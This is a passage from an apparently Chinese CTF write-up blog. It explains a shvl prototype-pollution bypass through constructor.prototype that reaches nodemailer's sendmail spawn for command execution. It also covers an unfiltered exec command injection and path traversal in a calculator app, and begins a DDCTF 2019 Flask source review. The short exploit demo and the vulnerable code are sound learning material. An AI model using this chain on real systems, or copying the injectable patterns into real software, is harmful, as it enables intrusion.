  <span class="token keyword">return</span> transporter<span class="token punctuation">.</span><span class="token function">sendMail</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

  email<span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> contents <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      shvl<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> key<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    contents<span class="token punctuation">.</span><span class="token keyword">from</span> <span class="token operator">=</span> <span class="token string">'"admin" &lt;admin@8-bit.pub>'</span><span class="token punctuation">;</span>

    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">await</span> <span class="token function">send</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"Success."</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token punctuation">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre>
<p>在nodemailer库中搜索几个动态命令执行相关函数，eval没找到，但是spawn有一个，开始往回看怎么到这里<br><code>nodemailer/lib/sendmail-transport/index.js</code>省略无关代码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> spawn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>spawn<span class="token punctuation">;</span>
<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">SendmailTransport</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        options <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// use a reference to spawn for mocking purposes</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_spawn <span class="token operator">=</span> spawn<span class="token punctuation">;</span>

        <span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Sendmail'</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>version <span class="token operator">=</span> packageData<span class="token punctuation">.</span>version<span class="token punctuation">;</span>

        <span class="token keyword">this</span><span class="token punctuation">.</span>path <span class="token operator">=</span> <span class="token string">'sendmail'</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>args <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>winbreak <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

        <span class="token keyword">this</span><span class="token punctuation">.</span>logger <span class="token operator">=</span> shared<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token punctuation">{</span>
            component<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span>component <span class="token operator">||</span> <span class="token string">'sendmail'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>path <span class="token operator">=</span> options<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>path <span class="token operator">=</span> options<span class="token punctuation">.</span>path<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>args <span class="token operator">=</span> options<span class="token punctuation">.</span>args<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>winbreak <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">,</span> <span class="token string">'windows'</span><span class="token punctuation">,</span> <span class="token string">'dos'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>newline <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token operator">...</span>
            sendmail <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_spawn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>path<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p>这里引入了spawn，赋值给自己的_spawn属性，最后_spawn(this.path,args)进行了一个命令执行<br>那么现在的目标就是控制住this.path和args<br>可以看到constructor传进来一个option，而option如果存在且为一个object，把option的path和args赋给自己，简直完美，接下来看下option怎么给以及怎么让transporter变成这个sendmail的</p>
<p>再从题目源码的<code>createTransport</code>进入，看我们创建出来的transporter是什么类型的，有没有可能成为sendmailTransport</p>
<pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>createTransport <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>transporter<span class="token punctuation">,</span> defaults<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> urlConfig<span class="token punctuation">;</span>
    <span class="token keyword">let</span> options<span class="token punctuation">;</span>
    <span class="token keyword">let</span> mailer<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token comment" spellcheck="true">// provided transporter is a configuration object, not transporter plugin</span>
        <span class="token punctuation">(</span><span class="token keyword">typeof</span> transporter <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> transporter<span class="token punctuation">.</span>send <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token operator">||</span>
        <span class="token comment" spellcheck="true">// provided transporter looks like a connection url</span>
        <span class="token punctuation">(</span><span class="token keyword">typeof</span> transporter <span class="token operator">===</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> <span class="token regex">/^(smtps?|direct):/i</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>transporter<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>urlConfig <span class="token operator">=</span> <span class="token keyword">typeof</span> transporter <span class="token operator">===</span> <span class="token string">'string'</span> <span class="token operator">?</span> transporter <span class="token punctuation">:</span> transporter<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// parse a configuration URL into configuration options</span>
            options <span class="token operator">=</span> shared<span class="token punctuation">.</span><span class="token function">parseConnectionUrl</span><span class="token punctuation">(</span>urlConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            options <span class="token operator">=</span> transporter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>pool<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            transporter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SMTPPool</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>sendmail<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            transporter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SendmailTransport</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>streamTransport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            transporter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StreamTransport</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>jsonTransport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            transporter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONTransport</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>SES<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            transporter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SESTransport</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            transporter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SMTPTransport</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    mailer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mailer</span><span class="token punctuation">(</span>transporter<span class="token punctuation">,</span> options<span class="token punctuation">,</span> defaults<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> mailer<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>这里的option就等于传进来的参数transporter，而我们的transporter没有配置这一串if else需要的属性，所以看起来我们最后的transporter是SMTPTransport，SMTPTransport看了半天并不能命令执行。</p>
<p>但是，没有配置的属性都能通过原型链污染来搞定，option的内容等于硬编码写入的transporter，自然没有sendmail，path，args等属性，但只要掌握一个原型链污染的点给它硬加上这个属性就能一波搞定</p>
<h4 id="shvl-2-0-2-原型链污染"><a href="#shvl-2-0-2-原型链污染" class="headerlink" title="shvl 2.0.2 原型链污染"></a>shvl 2.0.2 原型链污染</h4><p>本身发邮件之前的这一步引入外部库的深度迭代赋值就非常的奇怪，因此，而深度赋值最容易出现的漏洞就是原型链污染啦，真是相当的容易呢。进行一个<code>npm audit</code>-&gt;no vulnerablity，诶？<br>搜了一下，在2.0.1中存在非常直接的原型链污染，但是在2.0.2修了，而这里的package.json写的是<code>&quot;shvl&quot;: &quot;^2.0.2&quot;</code>。去GitHub翻了一下，修的方法也非常直接，加了一句<code>/__proto__/.test(path)</code>，直接不让用__proto__<br>但这里允许超级深入迭代，属性套的再深也能一层层的赋值进去，而如果理解了__proto__和constructor.prototype的区别的话，就能很容易的进行原型链污染</p>
<h5 id="proto-amp-amp-constructor-prototype"><a href="#proto-amp-amp-constructor-prototype" class="headerlink" title="__proto__&amp;&amp;constructor.prototype"></a>__proto__&amp;&amp;constructor.prototype</h5><p>一个对象的__proto__属性就像一个指针，指向自己这个类的原型，而constructor获取到对象的构造函数，构造函数的prototype就是这个类的原型<br>简单的例子，就是<code>Object.prototype === &#123;&#125;.__proto__</code><br>进行原型链污染时，要修改prototype下的属性，而不是prototype本身的值，就像是通过指针修改指针指向对象的属性，而不是把指针指向另一个对象，一开始忘了这茬搞了半天没搞定<br>所以直接用constructor.prototype原型链污染加上sendmail，path，args这几个参数就能打通了</p>
<p>刚好题目中shvl.set是遍历复制的，写个demo</p>
<pre class=" language-javascript"><code class="language-javascript">obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
shvl<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"constructor.prototype.sendmail"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
shvl<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"constructor.prototype.path"</span><span class="token punctuation">,</span> <span class="token string">"path"</span><span class="token punctuation">)</span>
shvl<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"constructor.prototype.args"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>args<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<p>完成命令执行</p>
<h2 id="pool-calc"><a href="#pool-calc" class="headerlink" title="pool_calc"></a>pool_calc</h2><p>其实是一个不难的题，但是上一个题做的我头昏脑涨的。。。这个题就智障的没写出来<br>附件就给了个docker-compose.yml，告诉我们起了4个docker，一个app和三个计算器，一个PHP一个java一个python<br>只有app暴露在外，剩下三个在docker的内网中，需要通过app进行交互<br>点开题目就有超级明显的提示<code>/redirect?filename=index.html</code>，像是一个任意文件读取，估计是js写的，猜一个app.js读到app的源码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span>exec<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> format <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"string-format"</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> dotenv <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"dotenv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

dotenv<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/redirect?filename=index.html"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"/redirect"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> filename <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filename
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/`</span></span> <span class="token operator">+</span> filename<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>


app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/calc'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> params <span class="token operator">=</span> req<span class="token punctuation">.</span>query
    <span class="token keyword">var</span> lang <span class="token operator">=</span> params<span class="token punctuation">.</span>language <span class="token operator">!==</span> undefined <span class="token operator">?</span> params<span class="token punctuation">.</span>language <span class="token punctuation">:</span> <span class="token string">"python"</span>

    <span class="token keyword">let</span> calc_client_path <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"python"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>py_calc_tool_path<span class="token punctuation">,</span>
        <span class="token string">"php"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>php_calc_tool_path<span class="token punctuation">,</span>
        <span class="token string">"java"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>java_calc_tool_path
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>lang <span class="token operator">===</span> <span class="token string">'python'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"action"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>action<span class="token punctuation">,</span>
            <span class="token string">"a"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>a<span class="token punctuation">,</span>
            <span class="token string">"b"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>b<span class="token punctuation">,</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>py_calc_address<span class="token punctuation">,</span>
            <span class="token string">"port"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>py_calc_port
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token function">format</span><span class="token punctuation">(</span>calc_client_path<span class="token punctuation">.</span>python <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token string">'-action {action} -a {a} -b {b} -ip {ip} -p {port}'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>lang <span class="token operator">===</span> <span class="token string">'php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"action"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>action<span class="token punctuation">,</span>
            <span class="token string">"a"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>a<span class="token punctuation">,</span>
            <span class="token string">"b"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>b<span class="token punctuation">,</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>php_calc_address<span class="token punctuation">,</span>
            <span class="token string">"port"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>php_calc_port
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token function">format</span><span class="token punctuation">(</span>calc_client_path<span class="token punctuation">.</span>php <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token string">'-action {action} -a {a} -b {b} -ip {ip} -p {port}'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>lang <span class="token operator">===</span> <span class="token string">'java'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"action"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>action<span class="token punctuation">,</span>
            <span class="token string">"a"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>a<span class="token punctuation">,</span>
            <span class="token string">"b"</span><span class="token punctuation">:</span> params<span class="token punctuation">.</span>b<span class="token punctuation">,</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>java_calc_address<span class="token punctuation">,</span>
            <span class="token string">"port"</span><span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>java_calc_port
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"java -jar"</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> calc_client_path<span class="token punctuation">.</span>java <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token string">'-action {action} -a {a} -b {b} -ip {ip} -p {port}'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Something Error"</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>


<span class="token keyword">const</span> port <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>web_app_port

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`App listening at http://0.0.0.0:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>那个时候已经看傻了，简单的看了一下后面的交互过程，然后就开始疯狂的想收集信息，猜解目录，大失败，进入自闭。。。。</p>
<p>后来赛后看分析才发现这个题cmd那里随便执行命令。。。。经典毫无过滤直接拼接的命令执行，可以直接命令执行拿到app下的flag</p>
<p>然后怎么个就能获取到剩下三个环节的源码？</p>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>用了pickle模块，毫无过滤，pickle反序列化照抄打通</p>
<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>反编译后直接看见flag</p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>之前一个比赛的题的非预期，有机会再看看</p>
<p>好像这个题就PHP那个非预期解法难一些，如果之前做过可能也还好，整体来说不是难题，但是那个时候真的头给锤歪了。。。这么明显的命令执行都没看见</p>
<h2 id="shell-gen"><a href="#shell-gen" class="headerlink" title="shell-gen"></a>shell-gen</h2><p>好像是个特别复杂的题，提到了docker-socket之类的东西<br>学一下docker逃逸什么的另补一篇吧</p>
<h2 id="non-RCE"><a href="#non-RCE" class="headerlink" title="non-RCE"></a>non-RCE</h2><p>java题，我是java废物，完全没看。据说是反序列化加条件竞争绕过检测</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>原型链污染</tag>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/%5BDDCTF%202019%5Dhomebrew%20event%20loop.html</url>
    <content><![CDATA[<h1 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h1><p>滴滴ctf的一个题，python的代码审计，没审出来</p>
<p>给了源码，很长一截，首先理清楚头绪就花了不久</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment" spellcheck="true"># censored</span>
url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span>


<span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment" spellcheck="true"># censored</span>


<span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> type<span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>


